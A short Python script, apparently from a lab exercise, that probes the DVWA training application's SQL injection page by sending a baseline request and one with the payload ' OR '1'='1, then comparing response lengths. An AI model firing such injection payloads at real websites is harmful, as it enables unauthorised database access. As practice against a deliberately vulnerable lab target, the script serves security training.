import requests
c={'PHPSESSID': 'g4lf3381t4oikauihrv5k69t70', 'security': 'low'}
b=requests.get('http://dvwa:80/vulnerabilities/sqli/', params={'id': 'test', 'Submit': 'Submit'}, cookies=c).text
t=requests.get('http://dvwa:80/vulnerabilities/sqli/', params={'id': "' OR '1'='1", 'Submit': 'Submit'}, cookies=c).text
print(f'Base: {len(b)}, Test: {len(t)}, Ratio: {abs(len(t)-len(b))/len(b):.2f}')
